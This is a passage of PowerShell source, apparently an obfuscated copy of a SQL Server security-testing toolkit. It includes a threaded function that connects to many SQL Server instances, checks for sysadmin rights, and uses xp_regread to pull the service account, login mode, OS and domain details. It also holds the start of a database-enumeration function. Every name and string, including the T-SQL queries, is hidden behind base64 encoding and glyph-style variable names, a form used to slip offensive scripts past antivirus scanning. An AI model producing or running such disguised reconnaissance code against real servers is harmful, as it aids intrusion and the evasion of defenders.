ACwADQAKACAAIAAgACAAIAAgACAAIAAnACQAewAvAD0APQA9AD0APQBcAC8AXAAvAFwAXwAvAD0APQA9AFwAfQAnACAAYQBzACAAWwBBAGMAdABpAHYAZQBTAGUAcwBzAGkAbwBuAHMAXQA=')))
        ${/===\___/\/\/\_/=} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${_/=\/=\/=\_/\/\/=} = ${_/=\/=\/=\_/\/\/=} + ${/===\___/\/\/\_/=}
    }
    End
    {
        ${_/=\/=\/=\_/\/\/=}
    }
}
Function  Get-SQLServerInfoThreaded
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 5,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_/=\/=\/=\_/\/\/=} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\/=\/=\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\/=\/=\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/=\/=\/=\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4ATgBhAG0AZQA='))))
        $null = ${_/=\/=\/=\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAA=='))))
        $null = ${_/=\/=\/=\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBBAGMAYwBvAHUAbgB0AA=='))))
        $null = ${_/=\/=\/=\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAE0AbwBkAGUA'))))
        $null = ${_/=\/=\/=\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAHUAcwB0AGUAcgBlAGQA'))))
        $null = ${_/=\/=\/=\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAUwBlAHIAdgBlAHIAVgBlAHIAcwBpAG8AbgBOAHUAbQBiAGUAcgA='))))
        $null = ${_/=\/=\/=\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAUwBlAHIAdgBlAHIATQBhAGoAbwByAFYAZQByAHMAaQBvAG4A'))))
        $null = ${_/=\/=\/=\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAUwBlAHIAdgBlAHIARQBkAGkAdABpAG8AbgA='))))
        $null = ${_/=\/=\/=\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAUwBlAHIAdgBlAHIAUwBlAHIAdgBpAGMAZQBQAGEAYwBrAA=='))))
        $null = ${_/=\/=\/=\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBTAEEAcgBjAGgAaQB0AGUAYwB0AHUAcgBlAA=='))))
        $null = ${_/=\/=\/=\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBzAE0AYQBjAGgAaQBuAGUAVAB5AHAAZQA='))))
        $null = ${_/=\/=\/=\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBTAFYAZQByAHMAaQBvAG4ATgBhAG0AZQA='))))
        $null = ${_/=\/=\/=\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBzAFYAZQByAHMAaQBvAG4ATgB1AG0AYgBlAHIA'))))
        $null = ${_/=\/=\/=\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwB1AHIAcgBlAG4AdABsAG8AZwBpAG4A'))))
        $null = ${_/=\/=\/=\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFMAeQBzAGEAZABtAGkAbgA='))))
        $null = ${_/=\/=\/=\_/\/\/=}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUAUwBlAHMAcwBpAG8AbgBzAA=='))))
        ${____/\/=\_/\/===\} = New-Object -TypeName System.Data.DataTable
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($Instance)
        {
            ${_/\/=\/=\/\/\____} = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + ${_/\/=\/=\/\/\____}
    }
    Process
    {
        ${____/\/=\_/\/===\} = ${____/\/=\_/\/===\} + $_
    }
    End
    {
        ${____/\__/\_/=\__/} = {
            $Instance = $_.Instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }
            ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
                $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
            }
            if(${__/\_/=\/==\_/=\_})
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
                }
                return
            }
            ${/=====\/\/\_/===\} = Get-SQLSession -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
            ? -FilterScript {
                $_.SessionStatus -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgB1AG4AbgBpAG4AZwA=')))
            } |
            measure -Line |
            select -Property Lines -ExpandProperty Lines
            ${__/\/==\____/\_/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | select -Property IsSysadmin -ExpandProperty IsSysadmin
            if(${__/\/==\____/\_/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
            {
                ${___/==\_/\/=\/=\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAtAC0AIABHAGUAdAAgAG0AYQBjAGgAaQBuAGUAIAB0AHkAcABlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARABFAEMATABBAFIARQAgAEAATQBhAGMAaABpAG4AZQBUAHkAcABlACAAIABTAFkAUwBOAEEATQBFAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBYAEUAQwBVAFQARQAgAG0AYQBzAHQAZQByAC4AZABiAG8ALgB4AHAAXwByAGUAZwByAGUAYQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAByAG8AbwB0AGsAZQB5AAkACQA9ACAATgAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFACcALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAawBlAHkACQAJAAkAPQAgAE4AJwBTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAEMAbwBuAHQAcgBvAGwAXABQAHIAbwBkAHUAYwB0AE8AcAB0AGkAbwBuAHMAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQAB2AGEAbAB1AGUAXwBuAGEAbQBlAAkACQA9ACAATgAnAFAAcgBvAGQAdQBjAHQAVAB5AHAAZQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAHYAYQBsAHUAZQAJAAkACQA9ACAAQABNAGEAYwBoAGkAbgBlAFQAeQBwAGUAIABvAHUAdABwAHUAdAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0ALQAgAEcAZQB0ACAATwBTACAAdgBlAHIAcwBpAG8AbgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQARQBDAEwAQQBSAEUAIABAAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAgACAAUwBZAFMATgBBAE0ARQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUAWABFAEMAVQBUAEUAIABtAGEAcwB0AGUAcgAuAGQAYgBvAC4AeABwAF8AcgBlAGcAcgBlAGEAZAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAcgBvAG8AdABrAGUAeQAJAAkAPQAgAE4AJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAGsAZQB5AAkACQAJAD0AIABOACcAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuACcALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAdgBhAGwAdQBlAF8AbgBhAG0AZQAJAAkAPQAgAE4AJwBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAJwAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAdgBhAGwAdQBlAAkACQAJAD0AIABAAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAgAG8AdQB0AHAAdQB0AA==')))
                ${__/\___/\/=\/==\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAEAATQBhAGMAaABpAG4AZQBUAHkAcABlACAAYQBzACAAWwBPAHMATQBhAGMAaABpAG4AZQBUAHkAcABlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABAAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAgAGEAcwAgAFsATwBTAFYAZQByAHMAaQBvAG4ATgBhAG0AZQBdACwA')))
            }
            else
            {
                ${___/==\_/\/=\/=\_} = ''
                ${__/\___/\/=\/==\_} = ''
            }
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAC0ALQAgAEcAZQB0ACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAEkAbgBmAG8AcgBtAGEAdABpAG8AbgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAtAC0AIABHAGUAdAAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABTAGUAcgB2AGkAYwBlACAATgBhAG0AZQAgAGEAbgBkACAAUABhAHQAaAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAEUAQwBMAEEAUgBFACAAQABTAFEATABTAGUAcgB2AGUAcgBJAG4AcwB0AGEAbgBjAGUAIAB2AGEAcgBjAGgAYQByACgAMgA1ADAAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAEUAQwBMAEEAUgBFACAAQABTAFEATABTAGUAcgB2AGUAcgBTAGUAcgB2AGkAYwBlAE4AYQBtAGUAIAB2AGEAcgBjAGgAYQByACgAMgA1ADAAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYAIABAAEAAUwBFAFIAVgBJAEMARQBOAEEATQBFACAAPQAgACcATQBTAFMAUQBMAFMARQBSAFYARQBSACcADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQgBFAEcASQBOAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAZQB0ACAAQABTAFEATABTAGUAcgB2AGUAcgBJAG4AcwB0AGEAbgBjAGUAIAA9ACAAJwBTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAFMAZQByAHYAaQBjAGUAcwBcAE0AUwBTAFEATABTAEUAUgBWAEUAUgAnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAZQB0ACAAQABTAFEATABTAGUAcgB2AGUAcgBTAGUAcgB2AGkAYwBlAE4AYQBtAGUAIAA9ACAAJwBNAFMAUwBRAEwAUwBFAFIAVgBFAFIAJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAE4ARAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAEwAUwBFAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEIARQBHAEkATgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAGUAdAAgAEAAUwBRAEwAUwBlAHIAdgBlAHIASQBuAHMAdABhAG4AYwBlACAAPQAgACcAUwBZAFMAVABFAE0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABTAGUAcgB2AGkAYwBlAHMAXABNAFMAUwBRAEwAJAAnACsAYwBhAHMAdAAoAEAAQABTAEUAUgBWAEkAQwBFAE4AQQBNAEUAIABhAHMAIAB2AGEAcgBjAGgAYQByACgAMgA1ADAAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAZQB0ACAAQABTAFEATABTAGUAcgB2AGUAcgBTAGUAcgB2AGkAYwBlAE4AYQBtAGUAIAA9ACAAJwBNAFMAUwBRAEwAJAAnACsAYwBhAHMAdAAoAEAAQABTAEUAUgBWAEkAQwBFAE4AQQBNAEUAIABhAHMAIAB2AGEAcgBjAGgAYQByACgAMgA1ADAAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUATgBEAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0ALQAgAEcAZQB0ACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAFMAZQByAHYAaQBjAGUAIABBAGMAYwBvAHUAbgB0AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQARQBDAEwAQQBSAEUAIABAAFMAZQByAHYAaQBjAGUAYQBjAGMAbwB1AG4AdABOAGEAbQBlACAAdgBhAHIAYwBoAGEAcgAoADIANQAwACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBYAEUAQwBVAFQARQAgAG0AYQBzAHQAZQByAC4AZABiAG8ALgB4AHAAXwBpAG4AcwB0AGEAbgBjAGUAXwByAGUAZwByAGUAYQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE4AJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwAIABAAFMAUQBMAFMAZQByAHYAZQByAEkAbgBzAHQAYQBuAGMAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE4AJwBPAGIAagBlAGMAdABOAGEAbQBlACcALABAAFMAZQByAHYAaQBjAGUAQQBjAGMAbwB1AG4AdABOAGEAbQBlACAATwBVAFQAUABVAFQALAAgAE4AJwBuAG8AXwBvAHUAdABwAHUAdAAnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0ALQAgAEcAZQB0ACAAYQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACAAbQBvAGQAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAEUAQwBMAEEAUgBFACAAQABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4ATQBvAGQAZQAgAEkATgBUAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUAWABFAEMAIABtAGEAcwB0AGUAcgAuAGQAYgBvAC4AeABwAF8AaQBuAHMAdABhAG4AYwBlAF8AcgBlAGcAcgBlAGEAZAAgAE4AJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAATgAnAFMAbwBmAHQAdwBhAHIAZQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwATQBTAFMAUQBMAFMAZQByAHYAZQByAFwATQBTAFMAUQBMAFMAZQByAHYAZQByACcALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABOACcATABvAGcAaQBuAE0AbwBkAGUAJwAsACAAQABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4ATQBvAGQAZQAgAE8AVQBUAFAAVQBUAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0ALQAgAEcAcgBhAGIAIABhAGQAZABpAHQAaQBvAG4AYQBsACAAaQBuAGYAbwByAG0AYQB0AGkAbwBuACAAYQBzACAAcwB5AHMAYQBkAG0AaQBuAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAewBfAF8AXwAvAD0APQBcAF8ALwBcAC8APQBcAC8APQBcAF8AfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAtAC0AIABSAGUAdAB1AHIAbgAgAHMAZQByAHYAZQByACAAYQBuAGQAIAB2AGUAcgBzAGkAbwBuACAAaQBuAGYAbwByAG0AYQB0AGkAbwBuAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMARQBMAEUAQwBUACAAIAAnACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAJwAgAGEAcwAgAFsAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAQABzAGUAcgB2AGUAcgBuAGEAbQBlACAAYQBzACAAWwBJAG4AcwB0AGEAbgBjAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQARQBGAEEAVQBMAFQAXwBEAE8ATQBBAEkATgAoACkAIABhAHMAIABbAEQAbwBtAGEAaQBuAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAUwBRAEwAUwBlAHIAdgBlAHIAUwBlAHIAdgBpAGMAZQBOAGEAbQBlACAAYQBzACAAWwBTAGUAcgB2AGkAYwBlAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEAAUwBlAHIAdgBpAGMAZQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAIABhAHMAIABbAFMAZQByAHYAaQBjAGUAQQBjAGMAbwB1AG4AdABdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAKABTAEUATABFAEMAVAAgAEMAQQBTAEUAIABAAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBNAG8AZABlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcASABFAE4AIAAxACAAVABIAEUATgAgACcAVwBpAG4AZABvAHcAcwAgAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgAnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcASABFAE4AIAAyACAAVABIAEUATgAgACcAVwBpAG4AZABvAHcAcwAgAGEAbgBkACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgAnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUATABTAEUAIAAnAFUAbgBrAG4AbwB3AG4AJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAE4ARAApACAAYQBzACAAWwBBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4ATQBvAGQAZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQwBBAFMARQAgACAAUwBFAFIAVgBFAFIAUABSAE8AUABFAFIAVABZACgAJwBJAHMAQwBsAHUAcwB0AGUAcgBlAGQAJwApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcASABFAE4AIAAwAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFQASABFAE4AIAAnAE4AbwAnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUATABTAEUAIAAnAFkAZQBzACcADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBOAEQAIABhAHMAIABbAEMAbAB1AHMAdABlAHIAZQBkAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAEUAUgBWAEUAUgBQAFIATwBQAEUAUgBUAFkAKAAnAHAAcgBvAGQAdQBjAHQAdgBlAHIAcwBpAG8AbgAnACkAIABhAHMAIABbAFMAUQBMAFMAZQByAHYAZQByAFYAZQByAHMAaQBvAG4ATgB1AG0AYgBlAHIAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMAVQBCAFMAVABSAEkATgBHACgAQABAAFYARQBSAFMASQBPAE4ALAAgAEMASABBAFIASQBOAEQARQBYACgAJwAyACcALAAgAEAAQABWAEUAUgBTAEkATwBOACkALAAgADQAKQAgAGEAcwAgAFsAUwBRAEwAUwBlAHIAdgBlAHIATQBhAGoAbwByAFYAZQByAHMAaQBvAG4AXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAZQByAHYAZQByAHAAcgBvAHAAZQByAHQAeQAoACcARQBkAGkAdABpAG8AbgAnACkAIABhAHMAIABbAFMAUQBMAFMAZQByAHYAZQByAEUAZABpAHQAaQBvAG4AXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMARQBSAFYARQBSAFAAUgBPAFAARQBSAFQAWQAoACcAUAByAG8AZAB1AGMAdABMAGUAdgBlAGwAJwApACAAQQBTACAAWwBTAFEATABTAGUAcgB2AGUAcgBTAGUAcgB2AGkAYwBlAFAAYQBjAGsAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMAVQBCAFMAVABSAEkATgBHACgAQABAAFYARQBSAFMASQBPAE4ALAAgAEMASABBAFIASQBOAEQARQBYACgAJwB4ACcALAAgAEAAQABWAEUAUgBTAEkATwBOACkALAAgADMAKQAgAGEAcwAgAFsATwBTAEEAcgBjAGgAaQB0AGUAYwB0AHUAcgBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsAXwBfAC8AXABfAF8AXwAvAFwALwA9AFwALwA9AD0AXABfAH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUgBJAEcASABUACgAUwBVAEIAUwBUAFIASQBOAEcAKABAAEAAVgBFAFIAUwBJAE8ATgAsACAAQwBIAEEAUgBJAE4ARABFAFgAKAAnAFcAaQBuAGQAbwB3AHMAIABOAFQAJwAsACAAQABAAFYARQBSAFMASQBPAE4AKQAsACAAMQA0ACkALAAgADMAKQAgAGEAcwAgAFsATwBzAFYAZQByAHMAaQBvAG4ATgB1AG0AYgBlAHIAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMAWQBTAFQARQBNAF8AVQBTAEUAUgAgAGEAcwAgAFsAQwB1AHIAcgBlAG4AdABsAG8AZwBpAG4AXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAJAB7AF8AXwAvAFwALwA9AD0AXABfAF8AXwBfAC8AXABfAC8APQB9ACcAIABhAHMAIABbAEkAcwBTAHkAcwBhAGQAbQBpAG4AXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnACQAewAvAD0APQA9AD0APQBcAC8AXAAvAFwAXwAvAD0APQA9AFwAfQAnACAAYQBzACAAWwBBAGMAdABpAHYAZQBTAGUAcwBzAGkAbwBuAHMAXQA=')))
            ${/===\___/\/\/\_/=} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            ${/===\___/\/\/\_/=} |
            % -Process {
                $null = ${_/=\/=\/=\_/\/\/=}.Rows.Add(
                    $_.ComputerName,
                    $_.Instance,
                    $_.DomainName,
                    $_.ServiceName,
                    $_.ServiceAccount,
                    $_.AuthenticationMode,
                    $_.Clustered,
                    $_.SQLServerVersionNumber,
                    $_.SQLServerMajorVersion,
                    $_.SQLServerEdition,
                    $_.SQLServerServicePack,
                    $_.OSArchitecture,
                    $_.OsMachineType,
                    $_.OSVersionName,
                    $_.OsVersionNumber,
                    $_.Currentlogin,
                    $_.IsSysadmin,
                    $_.ActiveSessions
                )
            }
        }
        ${____/\/=\_/\/===\} | Invoke-Parallel -ScriptBlock ${____/\__/\_/=\__/} -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return ${_/=\/=\/=\_/\/\/=}
    }
}
Function  Get-SQLDatabase
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases the current user has access to.')]
        [switch]$HasAccess,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases owned by a sysadmin.')]
        [switch]$SysAdminOnly,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/=\_____/\/\/=\__} = New-Object -TypeName System.Data.DataTable
        ${/=\_____/\__/=\/\} = New-Object -TypeName System.Data.DataTable
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAEkAZAA='))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE4AYQBtAGUA'))))
        $null = ${/=\_____/\__/=\/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE8AdwBuAGUAcgA='))))
